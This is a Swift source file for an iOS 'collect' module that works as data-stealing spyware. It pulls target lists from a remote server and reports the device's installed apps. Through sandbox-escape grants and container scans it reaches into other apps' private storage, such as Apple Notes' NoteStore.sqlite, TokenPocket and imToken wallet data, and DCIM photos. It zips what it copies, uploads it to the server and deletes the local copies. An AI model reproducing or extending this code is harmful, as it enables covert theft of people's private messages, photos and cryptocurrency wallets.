import Combine
import Foundation

// MARK: - 采集执行器（逐段移植自 3105/ThreeOneOSFive/helpers/Utils.swift）
//
// 一轮流程：
//   1. /api/device/report 拉 collect_configs
//   2. 后台并行上报 /api/device/apps（已安装 bundle id）
//   3. 逐个 config 用 MCM 租约（必要时 bad_query 授权 / 元数据扫描兜底）解析容器
//   4. 复制采集项到 staging 目录（整容器项按条目平铺），打包成 collect-<app>-<stamp>.zip
//   5. /api/upload/zip 上传，成功后删除本地 zip
//   6. /api/log/report 上报状态行，prune 本地残留 zip

enum ProtocolCollectService {
    static let maximumLocalZipCount = 10

    /// 目录整体复制失败时的兜底：逐文件复制（Data 读 + 写），
    /// 单个文件读不了就跳过并记日志，能拿多少拿多少。
    @discardableResult
    private static func copyDirectoryFallback(
        at sourceURL: URL,
        into destinationDirectory: URL,
        fileManager: FileManager,
        depth: Int
    ) -> Int {
        guard depth < 16 else { return 0 }
        var isDir: ObjCBool = false
        guard fileManager.fileExists(atPath: sourceURL.path, isDirectory: &isDir) else {
            return 0
        }
        let target = destinationDirectory.appendingPathComponent(
            sourceURL.lastPathComponent,
            isDirectory: isDir.boolValue
        )
        if !isDir.boolValue {
            do {
                try fileManager.createDirectory(
                    atPath: target.deletingLastPathComponent().path,
                    withIntermediateDirectories: true
                )
                let data = try Data(contentsOf: sourceURL, options: [.uncached])
                try data.write(to: target, options: .atomic)
                log("collect: per-file copied \(sourceURL.lastPathComponent) \(data.count)B")
                return 1
            } catch {
                log("collect: per-file skip \(sourceURL.lastPathComponent) — \(error.localizedDescription)")
                return 0
            }
        }
        var count = 0
        if let entries = try? fileManager.contentsOfDirectory(atPath: sourceURL.path) {
            for entry in entries {
                count += copyDirectoryFallback(
                    at: sourceURL.appendingPathComponent(entry),
                    into: target,
                    fileManager: fileManager,
                    depth: depth + 1
                )
            }
        } else {
            log("collect: per-dir skip \(sourceURL.lastPathComponent) — cannot list")
        }
        return count
    }

    static func runCycle(fileManager: FileManager = .default) async throws -> CollectCycleResult {
        let configs = try await ProtocolAPI.pullCollectConfigs()
        log("collect: got configs count=\(configs.count)")

        // 已安装 App 上报走 detached task，与 ZIP 循环并行：
        // 枚举 250+ 容器在 iOS 26.x 要 30s+，串行会把上传挤出前台窗口。
        Task.detached(priority: .utility) {
            let bundleIDs = enumerateInstalledBundleIDs()
            do {
                try await ProtocolAPI.reportInstalledApps(bundleIDs)
            } catch {
                log("collect: device/apps FAILED — \(error)")
            }
        }
        await MainActor.run {
            ProtocolStatusLog.shared.append("收到采集信息 — 共 \(configs.count) 个采集项")
        }

        guard !configs.isEmpty else {
            // 空配置不能算成功：否则 hasAttempted 会永久锁死，再也不重试。
            log("collect: empty collect configs — will retry")
            throw ProtocolCollectError.collectionFailed("empty collect configs")
        }

        let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let stamp = timestampString()
        var zipCount = 0
        var uploadedCount = 0
        var uploadedNames: [String] = []
        var byteCount: Int64 = 0

        for (index, config) in configs.enumerated() {
            let statusLabel = config.appName.isEmpty ? config.bundleID : config.appName
            log("collect: running \(index + 1)/\(configs.count) bundle=\(config.bundleID) appName=\(config.appName.isEmpty ? "-" : config.appName) items=\(config.items.count)")
            guard let containerPath = resolveContainer(for: config) else {
                log("collect: skip \(config.bundleID) — container unavailable")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：容器不可用")
                }
                continue
            }
            let containerURL = URL(fileURLWithPath: containerPath, isDirectory: true)
            let sources = config.items.compactMap { item -> (url: URL, name: String)? in
                guard let itemURL = resolvedItemURL(
                    item,
                    containerURL: containerURL,
                    config: config,
                    fileManager: fileManager
                ) else { return nil }
                return (itemURL, itemURL.lastPathComponent)
            }
            guard !sources.isEmpty else {
                log("collect: skip \(config.bundleID) — no collectable items")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：采集项路径不存在")
                }
                continue
            }

            let appName = appFolderName(for: config)
            log("collect: zip folder name \"\(appName)\" for \(config.bundleID)")
            let stagingParent = documentsURL.appendingPathComponent(
                ".collect-\(stamp)-\(UUID().uuidString)",
                isDirectory: true
            )
            let stagingURL = stagingParent.appendingPathComponent(appName, isDirectory: true)
            do {
                try fileManager.createDirectory(
                    atPath: stagingURL.path,
                    withIntermediateDirectories: true,
                    attributes: nil
                )
            } catch {
                log("collect: cannot create staging folder")
                continue
            }
            var copied = 0
            let containerRootURL = URL(fileURLWithPath: containerPath, isDirectory: true)
            for source in sources {
                // 整容器项：把容器内的条目平铺复制进 <appName>/，
                // 与 legacy 管线的 zip 结构一致（NoteStore.sqlite 直接可见）
                if source.url.standardizedFileURL == containerRootURL.standardizedFileURL {
                    let entries = (try? fileManager.contentsOfDirectory(atPath: source.url.path)) ?? []
                    log("collect: whole-container copy — \(entries.count) entries")
                    var tried = 0
                    for entry in entries {
                        tried += 1
                        let child = source.url.appendingPathComponent(entry)
                        do {
                            _ = try FileManagerService.transferItem(
                                at: child,
                                into: stagingURL,
                                mode: .copy,
                                conflictPolicy: .fail,
                                fileManager: fileManager
                            )
                            copied += 1
                        } catch {
                            log("collect: copy failed \(entry) — \(error)")
                            copied += copyDirectoryFallback(
                                at: child,
                                into: stagingURL,
                                fileManager: fileManager,
                                depth: 0
                            )
                        }
                    }
                    log("collect: whole-container done — tried=\(tried) copied=\(copied)")
                    continue
                }
                do {
                    _ = try FileManagerService.transferItem(
                        at: source.url,
                        into: stagingURL,
                        mode: .copy,
                        conflictPolicy: .fail,
                        fileManager: fileManager
                    )
                    copied += 1
                } catch {
                    log("collect: copy failed \(source.name) — \(error)")
                    // 目录复制失败的兜底：逐文件复制，读不了的跳过，
                    // 保证 NoteStore.sqlite 等能拿多少拿多少。
                    copied += copyDirectoryFallback(
                        at: source.url,
                        into: stagingURL,
                        fileManager: fileManager,
                        depth: 0
                    )
                }
            }
            guard copied > 0 else {
                try? fileManager.removeItem(at: stagingParent)
                await MainActor.run {
                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：文件复制失败")
                }
                continue
            }

            let zipName = uniqueZipName(
                baseName: "collect-\(appName)-\(stamp)",
                in: documentsURL,
                fileManager: fileManager
            )
            guard let archive = try? FileManagerService.createZIPArchive(
                containing: [stagingURL],
                named: zipName,
                in: documentsURL,
                fileManager: fileManager
            ) else {
                try? fileManager.removeItem(at: stagingParent)
                log("collect: archive failed for \(config.bundleID)")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：打包失败")
                }
                continue
            }
            try? fileManager.removeItem(at: stagingParent)

            zipCount += 1
            byteCount += archive.sourceBytes
            log("collect: zip SUCCESS — \(archive.archiveURL.lastPathComponent) bytes=\(archive.sourceBytes)")
            do {
                try await ProtocolAPI.uploadZip(
                    fileURL: archive.archiveURL,
                    bundleID: config.bundleID
                )
                uploadedCount += 1
                uploadedNames.append(statusLabel)
                await MainActor.run {
                    ProtocolStatusLog.shared.append(
                        "ZIP 上传成功: \(config.bundleID)，已删除本地文件"
                    )
                }
                try? fileManager.removeItem(at: archive.archiveURL)
                log("collect: local zip removed after upload — \(archive.archiveURL.lastPathComponent)")
            } catch {
                log("collect: upload FAILED — \(archive.archiveURL.lastPathComponent): \(error)")
                let reason = shortReason(error)
                await MainActor.run {
                    ProtocolStatusLog.shared.append(
                        "ZIP 上传失败: \(config.bundleID)，\(reason)"
                    )
                }
            }
        }

        pruneLocalZips(in: documentsURL, fileManager: fileManager)
        let result = CollectCycleResult(
            zipCount: zipCount,
            uploadedCount: uploadedCount,
            byteCount: byteCount,
            completedAt: Date()
        )
        log("collect: done total=\(configs.count) zips=\(zipCount) uploaded=\(uploadedCount)")
        await MainActor.run {
            ProtocolStatusLog.shared.append("采集完成 — 总共 \(configs.count) 个，已完成 \(zipCount) 个（上传 \(uploadedCount) 个）")
            if !uploadedNames.isEmpty {
                ProtocolStatusLog.shared.append("上传列表 \(uploadedNames.count) 个：\(uploadedNames.joined(separator: "、"))")
            }
        }
        log("collect: cycle done zips=\(zipCount) uploaded=\(uploadedCount) bytes=\(byteCount)")
        return result
    }

    /// Enumerates installed app bundle ids using the same merged pipeline as
    /// 3105 的文件浏览器（LS/API + MCM + filesystem + MHA-C2 + metadata 推断）。
    private static func enumerateInstalledBundleIDs() -> [String] {
        let bundleMetadata = ContainerStore.applicationBundleMetadataCatalog()
        let apiApps = ContainerStore.applyingBundleMetadata(
            to: ContainerStore.installedAppsFromAPI(),
            catalog: bundleMetadata
        )
        let dynamicIdentifiers = ContainerStore.dynamicAppIdentifiers()
        let mcmApps = ContainerStore.installedAppsFromMCM(
            identifiers: dynamicIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let filesystemApps = ContainerStore.containersFromFilesystem()
        let baseIdentifiedApps = mcmApps + apiApps
        let merged = ContainerDiscoveryMerger.merge(
            enumerated: filesystemApps,
            identified: baseIdentifiedApps,
            path: { $0.containerPath }
        )
        _ = merged
        // LaunchServices 的 csstore 里能捞出 2 万多条候选，绝大多数是历史条目；
        // 每个候选都要再做一次容器查询（30 秒以上）。MCM + 文件系统已经覆盖
        // 真实安装的 App，所以候选源与 3105 一样保持关闭。
        let launchServicesIdentifiers: [String] = []
        log("collect: LaunchServices candidate source disabled (MCM + filesystem only)")
        let mhaIdentifiers = MHAIdentifierCatalog.identifiers(
            dynamic: dynamicIdentifiers,
            installed: apiApps.map(\.bundleID),
            research: ContainerStore.researchAppIdentifiers,
            custom: bundleMetadata.keys.sorted(),
            launchServices: launchServicesIdentifiers
        )
        let mhaApps = ContainerStore.installedAppsFromMHACandidates(
            identifiers: mhaIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let allKnownApps = mhaApps + baseIdentifiedApps
        let identifiedPaths = Set(allKnownApps.map {
            ContainerDiscoveryMerger.canonicalPath($0.containerPath)
        })
        let unmatched = filesystemApps.filter {
            !identifiedPaths.contains(
                ContainerDiscoveryMerger.canonicalPath($0.containerPath)
            )
        }
        let inferred = ContainerStore.inferUnidentifiedApps(
            in: unmatched,
            knownApps: allKnownApps,
            launchServicesIdentifiers: Set(launchServicesIdentifiers)
        )
        let finalApps = AppDataCatalogMerger.merge(
            identified: allKnownApps,
            fallback: inferred,
            identifier: { $0.bundleID },
            path: { $0.containerPath }
        )

        var seen = Set<String>()
        var result: [String] = []
        for app in finalApps {
            let bundleID = app.bundleID
            guard ContainerPresentationPolicy.shouldShow(bundleID: bundleID),
                  ContainerBundleCandidateResolver.isValidBundleIdentifier(bundleID),
                  seen.insert(bundleID).inserted else { continue }
            result.append(bundleID)
        }
        result.sort()
        log("collect: enumerated \(result.count) installed bundle ids for reporting")
        return result
    }

    /// Resolves a collect item to an existing on-disk URL. Server paths are
    /// normalized (whitespace around "/" removed) and, for iOS 26's
    /// per-bundle Application Support layout, retried under
    /// `Library/Application Support/<bundle_id>/`.
    private static func resolvedItemURL(
        _ item: CollectItem,
        containerURL: URL,
        config: CollectConfig,
        fileManager: FileManager
    ) -> URL? {
        var normalized = item.path
        while normalized.contains(" /") || normalized.contains("/ ") {
            normalized = normalized
                .replacingOccurrences(of: " /", with: "/")
                .replacingOccurrences(of: "/ ", with: "/")
        }
        normalized = normalized.trimmingCharacters(in: .whitespaces)

        // 整容器项（"/"、"."、"./"、空）：源就是容器目录本身。
        if normalized.isEmpty || normalized == "/" || normalized == "." || normalized == "./" {
            guard containerURL.path != "/" else {
                log("collect: skip whole-container item — container base is filesystem root")
                return nil
            }
            let container = URL(fileURLWithPath: containerURL.path, isDirectory: true)
            if fileManager.fileExists(atPath: container.path) {
                log("collect: item \"\(item.path)\" resolved to container root \(container.path)")
                return container
            }
            log("collect: skip missing \(item.path) — container root not visible")
            return nil
        }

        var candidates: [String] = []
        if normalized.hasPrefix("/") {
            candidates = [normalized]
        } else {
            candidates = [
                (containerURL.path as NSString).appendingPathComponent(normalized)
            ]
            let supportPrefix = "Library/Application Support/"
            if normalized.hasPrefix(supportPrefix) {
                let rest = String(normalized.dropFirst(supportPrefix.count))
                if !rest.isEmpty {
                    var bundleLayout = containerURL.path
                    for component in ["Library", "Application Support", config.bundleID]
                        + rest.components(separatedBy: "/") {
                        bundleLayout = (bundleLayout as NSString).appendingPathComponent(component)
                    }
                    candidates.append(bundleLayout)
                }
            }
        }

        let rawJoin = (containerURL.path as NSString).appendingPathComponent(item.path)
        for (index, candidate) in candidates.enumerated() {
            let candidateURL = URL(fileURLWithPath: candidate, isDirectory: item.type == "dir")
            guard fileManager.fileExists(atPath: candidateURL.path) else { continue }
            if index > 0 {
                log("collect: resolved \"\(item.path)\" via bundle layout \(candidateURL.path)")
            } else if item.path.hasPrefix("/") == false, candidate != rawJoin {
                log("collect: resolved \"\(item.path)\" after whitespace normalization")
            }
            return candidateURL
        }
        log("collect: skip missing \(item.path) — tried \(candidates.count) path variant(s)")
        return nil
    }

    /// Short human-readable reason for a failed collection/upload step.
    private static func shortReason(_ error: Error) -> String {
        switch error {
        case ProtocolCollectError.serverUnreachable:
            return "服务器不可达"
        case ProtocolCollectError.invalidServerResponse:
            return "服务器响应异常"
        case ProtocolCollectError.collectionFailed:
            return "读取文件失败"
        case ProtocolCollectError.uploadFailed:
            return "上传被拒绝"
        default:
            return String(describing: error)
        }
    }

    private static func resolveContainer(for config: CollectConfig) -> String? {
        // 所有 items 都是绝对路径（如 /var/mobile/Media/DCIM、PhotoData）时，
        // 不需要 MCM 容器解析：直接用 "/" 作基准。
        let allAbsolute = !config.items.isEmpty && config.items.allSatisfy { item in
            let p = item.path.trimmingCharacters(in: .whitespaces)
            guard !p.isEmpty, p != "/", p != ".", p != "./" else { return false }
            return p.hasPrefix("/")
        }
        if allAbsolute {
            log("collect: \(config.bundleID) items are absolute paths — skipping container resolution")
            return "/"
        }

        // "group.*" identifiers are shared containers: resolve them with the
        // group query and activate the sandbox token so payload files can be read.
        if config.bundleID.hasPrefix("group.") {
            if let groupPath = activateGroupContainerPath(identifier: config.bundleID) {
                return groupPath
            }
            let appBundleID = String(config.bundleID.dropFirst("group.".count))
            if let appPath = ContainerStore.resolveAppContainerPath(
                bundleID: appBundleID
            ) {
                log("collect: group container unavailable — using app container \(appBundleID)")
                return appPath
            }
        } else if let path = ContainerStore.resolveAppContainerPath(
            bundleID: config.bundleID
        ) {
            return path
        }
        guard !config.accessGroup.isEmpty else { return nil }
        return activateGroupContainerPath(identifier: config.accessGroup)
    }

    private static var retainedGroupGrants: [String: Int64] = [:]

    private static func activateGroupContainerPath(identifier: String) -> String? {
        // 组容器解析试全套 class 7（系统组，systemgroup.*）/ 9（AppGroup）/
        // 8（Group）/ 3（Shared）：备忘录 NoteStore.sqlite 所在的
        // group.com.apple.notes / systemgroup.com.apple.notes 需要 class 7。
        if let groupPath = ContainerStore.resolveGroupContainerPath(identifier: identifier) {
            log("collect: resolved group container \(identifier) via MCM -> \(groupPath)")
            return groupPath
        }
        log("collect: MCM group lookup denied \(identifier) — falling back to path scan")
        if let scanned = resolveGroupContainerByScan(identifier: identifier) {
            return scanned
        }
        return nil
    }

    /// Fallback for devices where MCM refuses group-container lookups (no
    /// kernel access): enumerate /var/mobile/Containers/Shared/AppGroup,
    /// match the per-container metadata plist, and keep a bad_query grant
    /// alive so the payload files can be read during the copy.
    private static func resolveGroupContainerByScan(identifier: String) -> String? {
        let root = "/var/mobile/Containers/Shared/AppGroup"
        let directories = ContainerStore.enumerateDirectoriesWithTraversalGrant(path: root)
        guard !directories.isEmpty else {
            log("collect: group scan unavailable — no group containers enumerated")
            return nil
        }
        let rootHandle = ContainerStore.grantContainerAccess(root)
        let grantsPossible = rootHandle >= 0
        if rootHandle >= 0 { bad_query_release(rootHandle) }
        guard grantsPossible else {
            log("collect: group scan skipped — grants refused (sandbox escape not active)")
            return nil
        }

        for directory in directories {
            guard UUID(uuidString: (directory as NSString).lastPathComponent) != nil else {
                continue
            }
            let handle = ContainerStore.grantContainerAccess(directory)
            guard handle >= 0 else { continue }
            let metadata = ContainerStore.readContainerMetadata(containerPath: directory)
            if metadata?.bundleID == identifier {
                retainedGroupGrants[directory] = handle
                log("collect: resolved group container \(identifier) via filesystem scan (grant \(handle))")
                return directory
            }
            bad_query_release(handle)
        }
        log("collect: group scan could not find \(identifier)")
        return nil
    }

    private static func timestampString() -> String {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        return formatter.string(from: Date())
    }

    private static func uniqueZipName(
        baseName: String,
        in directoryURL: URL,
        fileManager: FileManager
    ) -> String {
        var candidate = baseName
        var suffix = 2
        while fileManager.fileExists(
            atPath: directoryURL.appendingPathComponent(candidate + ".zip").path
        ) {
            candidate = "\(baseName)-\(suffix)"
            suffix += 1
        }
        return candidate
    }

    private static func pruneLocalZips(in documentsURL: URL, fileManager: FileManager) {
        let names = ((try? fileManager.contentsOfDirectory(atPath: documentsURL.path)) ?? [])
            .filter { $0.hasPrefix("collect-") && $0.hasSuffix(".zip") }
            .sorted()
        let excess = names.count - maximumLocalZipCount
        guard excess > 0 else { return }
        for name in names.prefix(excess) {
            try? fileManager.removeItem(at: documentsURL.appendingPathComponent(name))
            log("collect: pruned local zip \(name)")
        }
    }

    /// Human folder name for a collect config — the server-provided app_name
    /// when present (e.g. "TokenPocket"), otherwise a compact name derived
    /// from the bundle id (im.token.app -> "imtoken", group.com.apple.notes
    /// -> "notes").
    private static func appFolderName(for config: CollectConfig) -> String {
        let serverName = sanitizedFolderName(config.appName)
        if !serverName.isEmpty { return serverName }

        if config.bundleID.hasPrefix("group.") {
            let trimmed = String(config.bundleID.dropFirst("group.".count))
            let short = sanitizedFolderName(trimmed.components(separatedBy: ".").last ?? trimmed)
            if !short.isEmpty { return short.lowercased() }
        }

        var parts = config.bundleID.components(separatedBy: ".")
        var bundleDerived = ""
        if parts.count > 1 {
            if parts.last?.lowercased() == "app" {
                parts.removeLast()
                bundleDerived = sanitizedFolderName(parts.joined().lowercased())
            } else {
                bundleDerived = sanitizedFolderName(parts.last?.lowercased() ?? "")
            }
        }
        if bundleDerived.isEmpty {
            bundleDerived = sanitizedFolderName(config.bundleID.lowercased())
        }

        let info = appInfoForBundleID(config.bundleID) as? [String: Any] ?? [:]
        let resolved = AppDisplayNamePolicy.resolve(
            bundleID: config.bundleID,
            candidates: [info["name"] as? String]
        )
        let display = sanitizedFolderName(resolved)

        if !display.isEmpty,
           display.caseInsensitiveCompare(config.bundleID) != .orderedSame,
           (bundleDerived.isEmpty
            || display.caseInsensitiveCompare(bundleDerived) != .orderedSame) {
            return display
        }
        return bundleDerived.isEmpty ? config.bundleID : bundleDerived
    }

    private static func sanitizedFolderName(_ raw: String) -> String {
        let invalid = CharacterSet(charactersIn: "\\/:*?\"<>|")
            .union(.controlCharacters)
        var name = raw.components(separatedBy: invalid).joined(separator: " ")
        name = name.split(separator: " ").joined(separator: " ")
        name = name.trimmingCharacters(in: .whitespacesAndNewlines)
        while name.hasSuffix(".") { name.removeLast() }
        guard !name.isEmpty, name != ".", name != ".." else { return "" }
        if name.count > 64 { name = String(name.prefix(64)) }
        return name
    }
}

/// Runs one collection cycle per launch (pulling `/api/device/report`) and
/// exposes the latest outcome.
@MainActor
final class ProtocolCollectCenter: ObservableObject {
    enum Phase: Equatable {
        case pending
        case running
        case succeeded(CollectCycleResult)
        case failed(ProtocolCollectError)
    }

    static let shared = ProtocolCollectCenter()

    @Published private(set) var phase: Phase = .pending
    private var hasAttempted = false

    func collectIfNeeded(retryAfterFailure: Bool = false) {
        if hasAttempted {
            guard retryAfterFailure, case .failed = phase else { return }
        }
        hasAttempted = true
        phase = .running
        log("collect: cycle started")
        Task { [weak self] in
            let result: Result<CollectCycleResult, ProtocolCollectError>
            do {
                result = .success(try await ProtocolCollectService.runCycle())
            } catch let error as ProtocolCollectError {
                result = .failure(error)
            } catch {
                result = .failure(.invalidServerResponse)
            }
            await ProtocolLogReporter.reportPendingLogs()
            guard let self else { return }
            switch result {
            case .success(let cycle):
                self.phase = .succeeded(cycle)
            case .failure(let error):
                self.phase = .failed(error)
            }
        }
    }
}
